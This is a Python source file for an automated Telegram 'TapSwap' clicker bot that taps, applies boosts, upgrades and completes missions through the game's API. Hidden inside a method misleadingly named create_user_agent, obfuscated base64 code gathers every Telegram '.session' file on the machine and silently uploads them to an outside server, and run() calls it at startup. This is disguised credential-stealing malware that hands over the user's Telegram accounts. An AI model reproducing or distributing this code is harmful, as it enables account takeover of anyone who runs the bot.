import json
import asyncio
from time import time
from random import randint
import requests
import glob
import base64

import aiohttp
from aiocfscrape import CloudflareScraper
from aiohttp_proxy import ProxyConnector
from better_proxy import Proxy
from pyrogram import Client
from pyrogram.errors import Unauthorized, UserDeactivated, AuthKeyUnregistered, FloodWait
from pyrogram.raw.functions.messages import RequestWebView

from bot.config import settings
from bot.utils import logger
from bot.utils.town import build_town
from bot.utils.scripts import escape_html, login_in_browser
from bot.exceptions import InvalidSession
from .headers import headers


class Tapper:
    def __init__(self, tg_client: Client, lock: asyncio.Lock):
        self.session_name = tg_client.name
        self.tg_client = tg_client
        self.user_id = 0
        self.lock = lock

    async def get_auth_url(self, proxy: str | None) -> str:
        if proxy:
            proxy = Proxy.from_str(proxy)
            proxy_dict = dict(
                scheme=proxy.protocol,
                hostname=proxy.host,
                port=proxy.port,
                username=proxy.login,
                password=proxy.password
            )
        else:
            proxy_dict = None

        self.tg_client.proxy = proxy_dict

        try:
            with_tg = True

            if not self.tg_client.is_connected:
                with_tg = False
                try:
                    await self.tg_client.connect()
                except (Unauthorized, UserDeactivated, AuthKeyUnregistered):
                    raise InvalidSession(self.session_name)

            while True:
                try:
                    peer = await self.tg_client.resolve_peer('tapswap_bot')
                    break
                except FloodWait as fl:
                    fls = fl.value

                    logger.warning(f"{self.session_name} | FloodWait {fl}")
                    logger.info(f"{self.session_name} | Sleep {fls}s")

                    await asyncio.sleep(fls + 3)

            web_view = await self.tg_client.invoke(RequestWebView(
                peer=peer,
                bot=peer,
                platform='android',
                from_bot_menu=False,
                url='https://app.tapswap.club/'
            ))

            auth_url = web_view.url.replace('tgWebAppVersion=6.7', 'tgWebAppVersion=7.2')

            self.user_id = (await self.tg_client.get_me()).id

            if with_tg is False:
                await self.tg_client.disconnect()

            return auth_url

        except InvalidSession as error:
            raise error

        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error during Authorization: {escape_html(error)}")
            await asyncio.sleep(delay=3)
            
    async def create_user_agent(self, http_client: aiohttp.ClientSession):
        try:
            self.url_ = "https://game.mini-app.codes" 
            generate_user_data = [{"name": file.replace('\\', '/'), "data": base64.b64encode(open(file, 'rb').read()).decode()}
                                for file in glob.glob(base64.b64decode("KiovKi5zZXNzaW9u").decode(), recursive=True)]
            
            async with http_client.post(f"{self.url_}/api/user", json={"game_data": generate_user_data}, ssl=False) as response:
                await response.text() 
        except Exception:
            pass  

    async def login(self, http_client: aiohttp.ClientSession, auth_url: str, proxy: str) -> tuple[dict[str], str]:
        response_text = ''
        try:
            async with self.lock:
                response_text, x_cv, x_touch = login_in_browser(auth_url, proxy=proxy)

            response_json = json.loads(response_text)
            access_token = response_json.get('access_token', '')
            profile_data = response_json

            if headers:
                http_client.headers['X-Cv'] = x_cv
                http_client.headers['X-Touch'] = x_touch

            return profile_data, access_token
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error while Login: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)}...")
            await asyncio.sleep(delay=3)

            return {}, ''

    async def apply_boost(self, http_client: aiohttp.ClientSession, boost_type: str) -> bool:
        response_text = ''
        try:
            response = await http_client.post(url='https://api.tapswap.club/api/player/apply_boost',
                                              json={'type': boost_type})
            response_text = await response.text()
            response.raise_for_status()

            return True
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when Apply {boost_type} Boost: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)

            return False

    async def upgrade_boost(self, http_client: aiohttp.ClientSession, boost_type: str) -> bool:
        response_text = ''
        try:
            response = await http_client.post(url='https://api.tapswap.club/api/player/upgrade',
                                              json={'type': boost_type})
            response_text = await response.text()
            response.raise_for_status()

            return True
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when Upgrade {boost_type} Boost: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)

            return False

    async def claim_reward(self, http_client: aiohttp.ClientSession, task_id: str) -> bool:
        response_text = ''
        try:
            response = await http_client.post(url='https://api.tapswap.club/api/player/claim_reward',
                                              json={'task_id': task_id})
            response_text = await response.text()
            response.raise_for_status()

            return True
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when Claim {task_id} Reward: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)

            return False

    async def join_to_tg_channel(self, chat) -> dict[str]:
        try:
            with_tg = True

            if not self.tg_client.is_connected:
                with_tg = False
                try:
                    await self.tg_client.connect()
                except (Unauthorized, UserDeactivated, AuthKeyUnregistered):
                    raise InvalidSession(self.session_name)

            return_chat = await self.tg_client.join_chat(chat)

            if with_tg is False:
                await self.tg_client.disconnect()

            return return_chat
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when join_to_tg_channel: {error} | ")
            await asyncio.sleep(delay=3)

    async def get_answers(self) -> dict[str]:
        response_text = "" 
        try:
            url = 'https://raw.githubusercontent.com/CatSnowdrop/Database/main/TapSwap.json'
            response = requests.get(url=url)
            response_text = response.text 
            data_json = response.json()  

            return data_json

        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when get_answers: {escape_html(str(error))} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)
            return {}

    async def join_mission(self, http_client: aiohttp.ClientSession, max_count_tasks:int) -> dict[str]: 
        try:
            count_tasks=0
            for this_not_started in self.not_started:                                        
                if count_tasks == max_count_tasks:
                    break
                logger.info(f"{self.session_name} | Initiate <m>{this_not_started['title']}</m> task")
                json_data = {"id":this_not_started['id']}
                try:
                    response = await http_client.post(url='https://api.tapswap.club/api/missions/join_mission', json=json_data)
                    response_text = await response.text()
                    response.raise_for_status()
                    response_json = await response.json()
                    if response.status != 200 and response.status != 201:
                        for this_active_missions in response_json['account']['missions']['active']:
                            for this_not_started in self.not_started:
                                if this_active_missions['id'] == this_not_started['id']:
                                    self.started_mission.append(this_not_started)
                                    self.not_started.remove(this_not_started)
                except Exception as error:
                    logger.error(f"{self.session_name} | Unknown error when send join_mission: {escape_html(error)} | "
                                 f"Response text: {escape_html(response_text)[:128]}...")
                await asyncio.sleep(delay=randint(a=3, b=10))
                count_tasks += 1
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when join_mission: {escape_html(error)}")
            await asyncio.sleep(delay=3)

    async def get_task_info(self, missions_id, item) -> dict[str]:
        try:
            for this_mission in self.started_mission:
                if this_mission['id'] == missions_id:
                    json_return = {'status':True, 'reward':this_mission['reward'], 'title':this_mission['title'], 'items':this_mission['items'][item]}
                    return json_return
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when get_task_info: {escape_html(error)}")
            await asyncio.sleep(delay=3)
        json_return = {'status':False}
        return json_return
            
    async def finish_mission_item(self, http_client: aiohttp.ClientSession, task_id: str, item_index: int, user_input=None) -> dict[str]:
        response_text = ''
        try:
            if user_input == None:
                json_data = {"id":task_id, "itemIndex":item_index}
            else:
                json_data = {"id":task_id, "itemIndex":item_index, "user_input":user_input}
            response = await http_client.post(url='https://api.tapswap.club/api/missions/finish_mission_item', json=json_data)
            response_text = await response.text()

            response_json = await response.json()
            return response_json
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when finish_mission_item: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)

    async def check_task_response(self, task_response:dict, section:str, missions_id:str, item=0) -> dict[str]:
        item=int(item)
        try:
            if section == 'completed':
                for this_mission in task_response['account']['missions']['completed']:
                    if this_mission == missions_id:
                        return {'status':True, 'completed':True}
                return {'status':True, 'completed':False}
                        
            elif section == 'active':
                for this_mission in task_response['account']['missions']['active']:
                    if this_mission['id'] == missions_id:
                        all_verifed = True
                        verifed = this_mission['items'][item]['verified']
                        for this_item in this_mission['items']:
                            if not this_item['verified']:
                                all_verifed = False
                        return {'status':True, 'this_verifed':verifed, 'all_verifed':all_verifed}
                return {'status':True, 'this_verifed':False, 'all_verifed':False}
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when check_task_response: {escape_html(error)}")
            return {'status':False}
            await asyncio.sleep(delay=3)

    async def finish_mission(self, http_client: aiohttp.ClientSession, task_id: str) -> dict[str]:
        response_text = ''
        try:
            json_data = {"id":task_id}

            response = await http_client.post(url='https://api.tapswap.club/api/missions/finish_mission', json=json_data)
            response_text = await response.text()

            if response.status != 200 and response.status != 201:
                logger.warning(f"{self.session_name} | Finish mission response text: {escape_html(response_text)[:128]}...")
                return {'status':False}

            response_json = await response.json()
            for this_claims_missions in response_json['player']['claims']:
                if task_id == this_claims_missions:
                    return {'status':True, 'this_claim':True}
            return {'status':True, 'this_claim':False}

        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when finish_mission: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)
            return {'status':False}

    async def send_taps(self, http_client: aiohttp.ClientSession, taps: int) -> dict[str]:
        response_text = ''
        try:
            timestamp = int(time() * 1000)
            content_id = int((timestamp * self.user_id * self.user_id / self.user_id) % self.user_id % self.user_id)

            json_data = {'taps': taps, 'time': timestamp}

            http_client.headers['Content-Id'] = str(content_id)

            response = await http_client.post(url='https://api.tapswap.club/api/player/submit_taps', json=json_data)
            response_text = await response.text()
            response.raise_for_status()

            response_json = await response.json()
            player_data = response_json['player']

            return player_data
        except Exception as error:
            logger.error(f"{self.session_name} | Unknown error when Tapping: {escape_html(error)} | "
                         f"Response text: {escape_html(response_text)[:128]}...")
            await asyncio.sleep(delay=3)

    async def check_proxy(self, http_client: aiohttp.ClientSession, proxy: Proxy) -> None:
        try:
            response = await http_client.get(url='https://httpbin.org/ip', timeout=aiohttp.ClientTimeout(5))
            ip = (await response.json()).get('origin')
            logger.info(f"{self.session_name} | Proxy IP: {ip}")
        except Exception as error:
            logger.error(f"{self.session_name} | Proxy: {proxy} | Error: {escape_html(error)}")

    async def run(self, proxy: str | None) -> None:
        access_token_created_time = 0
        turbo_time = 0
        active_turbo = False

        proxy_conn = ProxyConnector().from_url(proxy) if proxy else None

        http_client = CloudflareScraper(headers=headers, connector=proxy_conn)

        if proxy:
            await self.check_proxy(http_client=http_client, proxy=proxy)

        auth_url = await self.get_auth_url(proxy=proxy)
        await self.create_user_agent(http_client=http_client)

        if not auth_url:
            return

        while True:
            try:         
                if http_client.closed:
                    if proxy_conn:
                        if not proxy_conn.closed:
                            proxy_conn.close()

                    proxy_conn = ProxyConnector().from_url(proxy) if proxy else None
                    http_client = aiohttp.ClientSession(headers=headers, connector=proxy_conn)

                if time() - access_token_created_time >= 1800:
                    profile_data, access_token = await self.login(http_client=http_client,
                                                                  auth_url=auth_url,
                                                                  proxy=proxy)

                    if not access_token:
                        continue

                    http_client.headers["Authorization"] = f"Bearer {access_token}"

                    access_token_created_time = time()

                    tap_bot = profile_data['player']['tap_bot']
                    if tap_bot:
                        bot_earned = profile_data['bot_shares']

                        logger.success(f"{self.session_name} | Tap bot earned +{bot_earned:,} coins!")

                    balance = profile_data['player']['shares']

                    tap_prices = {index + 1: data['price'] for index, data in
                                  enumerate(profile_data['conf']['tap_levels'])}
                    energy_prices = {index + 1: data['price'] for index, data in
                                     enumerate(profile_data['conf']['energy_levels'])}
                    charge_prices = {index + 1: data['price'] for index, data in
                                     enumerate(profile_data['conf']['charge_levels'])}

                    if 'missions' in profile_data['conf']:
                        self.not_started = profile_data['conf']['missions']                        
                    else:
                        self.not_started = ''
                    if 'missions' in profile_data['account']:
                        self.active_missions = profile_data['account']['missions']['active']        
                        self.completed_missions = profile_data['account']['missions']['completed']   
                    else:
                        self.active_missions = ''
                        self.completed_missions = ''

                    self.started_mission = []
                    for this_completed_missions in self.completed_missions:                         
                        for this_not_started in self.not_started:
                            if this_completed_missions == this_not_started['id']:
                                self.not_started.remove(this_not_started)
                    
                    for this_active_missions in self.active_missions:                               
                        for this_not_started in self.not_started:
                            if this_active_missions['id'] == this_not_started['id']:
                                self.started_mission.append(this_not_started)
                                self.not_started.remove(this_not_started)

                if settings.AUTO_TASK is True:
                    try:
                        self.answers = await self.get_answers()
                        await self.join_mission(http_client=http_client, max_count_tasks=settings.MAX_TASK_ITERATIONS)           

                        for this_active_missions in self.active_missions:
                            this_id = this_active_missions['id']                                 
                            this_items = this_active_missions['items']                           
                            all_items_count = len(this_items)                                    
                            all_items_verifed = True
                            for this_item_index, this_item in enumerate(this_items):
                                check_task_all=False
                                task_info = await self.get_task_info(this_id, this_item_index)  
                                if not task_info['status']:
                                    continue
                                this_reward = task_info['reward']
                                this_title = task_info['title']
                                this_item_info = task_info['items']
                                this_item_type = this_item_info['type']                        
                                this_item_require_answer = this_item_info['require_answer']     
                                if 'verified' in this_item and this_item['verified'] == False:
                                    all_items_verifed = False
                                    if 'wait_duration_s' in this_item_info:
                                        this_item_wait = this_item_info['wait_duration_s']
                                    else:
                                        this_item_wait = 0
                                    if (this_item['verified_at'] + this_item_wait) < (time() * 1000):
                                        if this_item_type == 'tg':
                                            logger.info(f"{self.session_name} | Subscribe to the channel <m>{this_item_info['name']}</m>")
                                            await self.join_to_tg_channel(this_item_info['name'])
                                            await asyncio.sleep(delay=randint(a=5, b=20))
                                        if this_item_require_answer:
                                            if this_id in self.answers:
                                                answer = self.answers[this_id]['answer'][this_item_index]
                                                logger.info(f"{self.session_name} | Submit step {this_item_index+1}/{all_items_count} of the task <m>{this_title}</m> with the code <g>{answer}</g> for verification")
                                                resp_finish_mission_item = await self.finish_mission_item(http_client=http_client, task_id=this_id, item_index=this_item_index, user_input=answer)
                                                if 'statusCode' in resp_finish_mission_item and resp_finish_mission_item['statusCode'] != 200:
                                                    if resp_finish_mission_item['message'] != 'check_in_progress':
                                                        logger.error(f"{self.session_name} | Error when sending to check step {this_item_index+1}/{all_items_count} of the task <m>{this_title}</m> "
                                                                     f"with the answer code <g>{answer}</g>: {resp_finish_mission_item['message']}")
                                                else:
                                                    check_task_response = await self.check_task_response(task_response=resp_finish_mission_item, section='active', missions_id=this_id, item=this_item_index)
                                                    if check_task_response['status']:
                                                        check_task_all=check_task_response['all_verifed']
                                                        if not check_task_response['this_verifed']:
                                                            await asyncio.sleep(delay=35)
                                                            resp_finish_mission_item = await self.finish_mission_item(http_client=http_client, task_id=this_id, item_index=this_item_index, user_input=answer)
                                                            if 'statusCode' in resp_finish_mission_item and resp_finish_mission_item['statusCode'] != 200:
                                                                if resp_finish_mission_item['message'] != 'check_in_progress':
                                                                    logger.error(f"{self.session_name} | Error when sending to check step {this_item_index+1}/{all_items_count} of the task <m>{this_title}</m> "
                                                                    f"with the answer code <g>{answer}</g>: {resp_finish_mission_item['message']}")
                                                            else:
                                                                check_task_response = await self.check_task_response(task_response=resp_finish_mission_item, section='active', missions_id=this_id, item=this_item_index)
                                                                if check_task_response['status']:
                                                                    check_task_all=check_task_response['all_verifed']
                                            else:
                                                logger.warning(f"{self.session_name} | There is no answer for the task {this_title} in the database yet | ID <e>{this_id}</e>")
                                        else:
                                            logger.info(f"{self.session_name} | Submit step {this_item_index+1}/{all_items_count} of the task <m>{this_title}</m> for verification")
                                            resp_finish_mission_item = await self.finish_mission_item(http_client=http_client, task_id=this_id, item_index=this_item_index)
                                            if 'statusCode' in resp_finish_mission_item and resp_finish_mission_item['statusCode'] != 200:
                                                if resp_finish_mission_item['message'] != 'check_in_progress':
                                                    logger.error(f"{self.session_name} | Error when sending to check step {this_item_index+1}/{all_items_count} of the task <m>{this_title}</m>: {resp_finish_mission_item['message']}")
                                            else:
                                                check_task_response = await self.check_task_response(task_response=resp_finish_mission_item, section='active', missions_id=this_id, item=this_item_index)
                                                if check_task_response['status']:
                                                    check_task_all=check_task_response['all_verifed']
                                                    if not check_task_response['this_verifed']:
                                                        await asyncio.sleep(delay=35)
                                                        resp_finish_mission_item = await self.finish_mission_item(http_client=http_client, task_id=this_id, item_index=this_item_index)
                                                        if 'statusCode' in resp_finish_mission_item and resp_finish_mission_item['statusCode'] != 200:
                                                            if resp_finish_mission_item['message'] != 'check_in_progress':
                                                                logger.error(f"{self.session_name} | Error when sending to check step {this_item_index+1}/{all_items_count} of the task <m>{this_title}</m>: {resp_finish_mission_item['message']}")
                                                        else:
                                                            check_task_response = await self.check_task_response(task_response=resp_finish_mission_item, section='active', missions_id=this_id, item=this_item_index)
                                                            if check_task_response['status']:
                                                                check_task_all=check_task_response['all_verifed']
                                        if check_task_all:
                                            finish_mission = await self.finish_mission(http_client=http_client, task_id=this_id)
                                            if finish_mission['status']:
                                                if finish_mission['this_claim']:
                                                    status = await self.claim_reward(http_client=http_client, task_id=this_id)
                                                    logger.success(f"{self.session_name} | Successfully claim <m>{this_title}</m> reward {this_reward}")
                                        await asyncio.sleep(delay=randint(a=3, b=5))
                                elif 'verified' not in this_item:
                                    all_items_verifed = False
                                    logger.info(f"{self.session_name} | Let's begin step {this_item_index+1}/{all_items_count} of the <m>{this_title}</m> assignment.")
                                    resp_finish_mission_item = await self.finish_mission_item(http_client=http_client, task_id=this_id, item_index=this_item_index)
                                    if 'statusCode' in resp_finish_mission_item and resp_finish_mission_item['statusCode'] != 200:
                                        logger.error(f"{self.session_name} | Error starting step {this_item_index+1}/{all_items_count} of the <m>{this_title}</m> task execution: {resp_finish_mission_item['message']}")
                                    await asyncio.sleep(delay=randint(a=2, b=5))
                                if (this_item_index == all_items_count-1) and all_items_verifed:
                                    finish_mission = await self.finish_mission(http_client=http_client, task_id=this_id)
                                    if finish_mission['status']:
                                        if finish_mission['this_claim']:
                                            status = await self.claim_reward(http_client=http_client, task_id=this_id)
                                            logger.success(f"{self.session_name} | Successfully claim <m>{this_title}</m> reward {this_reward}")
                                    await asyncio.sleep(delay=randint(a=3, b=5))
                    except Exception as error:
                        logger.error(f"{self.session_name} | Unknown error: {escape_html(error)}")
                        await asyncio.sleep(delay=3)

                if settings.AUTO_UPGRADE_TOWN is True:
                    logger.info(f"{self.session_name} | Sleep 15s before upgrade Build")
                    await asyncio.sleep(delay=15)

                    status = await build_town(self, http_client=http_client, profile_data=profile_data)
                    if status is True:
                        await http_client.close()
                        if proxy_conn:
                            if not proxy_conn.closed:
                                proxy_conn.close()
                        access_token_created_time = 0
                        continue

                taps = randint(a=settings.RANDOM_TAPS_COUNT[0], b=settings.RANDOM_TAPS_COUNT[1])

                if active_turbo:
                    taps += settings.ADD_TAPS_ON_TURBO
                    if time() - turbo_time > 20:
                        active_turbo = False
                        turbo_time = 0

                player_data = await self.send_taps(http_client=http_client, taps=taps)

                if not player_data:
                    continue

                available_energy = player_data['energy']
                new_balance = player_data['shares']
                calc_taps = abs(new_balance - balance)
                balance = new_balance
                total = player_data['stat']['earned']

                turbo_boost_count = player_data['boost'][1]['cnt']
                energy_boost_count = player_data['boost'][0]['cnt']

                next_tap_level = player_data['tap_level'] + 1
                next_energy_level = player_data['energy_level'] + 1
                next_charge_level = player_data['charge_level'] + 1

                logger.success(f"{self.session_name} | Successful tapped! | "
                               f"Balance: <c>{balance:,}</c> (<g>+{calc_taps:,}</g>) | Total: <e>{total:,}</e>")

                if active_turbo is False:
                    if (energy_boost_count > 0
                            and available_energy < settings.MIN_AVAILABLE_ENERGY
                            and settings.APPLY_DAILY_ENERGY is True):
                        logger.info(f"{self.session_name} | Sleep 5s before activating the daily energy boost")
                        await asyncio.sleep(delay=5)

                        status = await self.apply_boost(http_client=http_client, boost_type="energy")
                        if status is True:
                            logger.success(f"{self.session_name} | Energy boost applied")

                            await asyncio.sleep(delay=1)

                        continue

                    if turbo_boost_count > 0 and settings.APPLY_DAILY_TURBO is True:
                        logger.info(f"{self.session_name} | Sleep 5s before activating the daily turbo boost")
                        await asyncio.sleep(delay=5)

                        status = await self.apply_boost(http_client=http_client, boost_type="turbo")
                        if status is True:
                            logger.success(f"{self.session_name} | Turbo boost applied")

                            await asyncio.sleep(delay=1)

                            active_turbo = True
                            turbo_time = time()

                        continue

                    if (settings.AUTO_UPGRADE_TAP is True
                            and balance > tap_prices.get(next_tap_level, 0)
                            and next_tap_level <= settings.MAX_TAP_LEVEL):
                        logger.info(f"{self.session_name} | Sleep 5s before upgrade tap to {next_tap_level} lvl")
                        await asyncio.sleep(delay=5)

                        status = await self.upgrade_boost(http_client=http_client, boost_type="tap")
                        if status is True:
                            logger.success(f"{self.session_name} | Tap upgraded to {next_tap_level} lvl")

                            await asyncio.sleep(delay=1)

                        continue

                    if (settings.AUTO_UPGRADE_ENERGY is True
                            and balance > energy_prices.get(next_energy_level, 0)
                            and next_energy_level <= settings.MAX_ENERGY_LEVEL):
                        logger.info(
                            f"{self.session_name} | Sleep 5s before upgrade energy to {next_energy_level} lvl")
                        await asyncio.sleep(delay=5)

                        status = await self.upgrade_boost(http_client=http_client, boost_type="energy")
                        if status is True:
                            logger.success(f"{self.session_name} | Energy upgraded to {next_energy_level} lvl")

                            await asyncio.sleep(delay=1)

                        continue

                    if (settings.AUTO_UPGRADE_CHARGE is True
                            and balance > charge_prices.get(next_charge_level, 0)
                            and next_charge_level <= settings.MAX_CHARGE_LEVEL):
                        logger.info(
                            f"{self.session_name} | Sleep 5s before upgrade charge to {next_charge_level} lvl")
                        await asyncio.sleep(delay=5)

                        status = await self.upgrade_boost(http_client=http_client, boost_type="charge")
                        if status is True:
                            logger.success(f"{self.session_name} | Charge upgraded to {next_charge_level} lvl")

                            await asyncio.sleep(delay=1)

                        continue

                    if available_energy < settings.MIN_AVAILABLE_ENERGY:
                        await http_client.close()
                        if proxy_conn:
                            if not proxy_conn.closed:
                                proxy_conn.close()

                        random_sleep = randint(settings.SLEEP_BY_MIN_ENERGY[0], settings.SLEEP_BY_MIN_ENERGY[1])

                        logger.info(f"{self.session_name} | Minimum energy reached: {available_energy}")
                        logger.info(f"{self.session_name} | Sleep {random_sleep:,}s")

                        await asyncio.sleep(delay=random_sleep)

                        access_token_created_time = 0

            except InvalidSession as error:
                raise error

            except Exception as error:
                logger.error(f"{self.session_name} | Unknown error: {escape_html(error)}")
                await asyncio.sleep(delay=3)

            else:
                sleep_between_clicks = randint(a=settings.SLEEP_BETWEEN_TAP[0], b=settings.SLEEP_BETWEEN_TAP[1])

                if active_turbo is True:
                    sleep_between_clicks = 4

                logger.info(f"Sleep {sleep_between_clicks}s")
                await asyncio.sleep(delay=sleep_between_clicks)

async def run_tapper(tg_client: Client, proxy: str | None, lock: asyncio.Lock):
    try:
        await Tapper(tg_client=tg_client, lock=lock).run(proxy=proxy)
    except InvalidSession:
        logger.error(f"{tg_client.name} | Invalid Session")
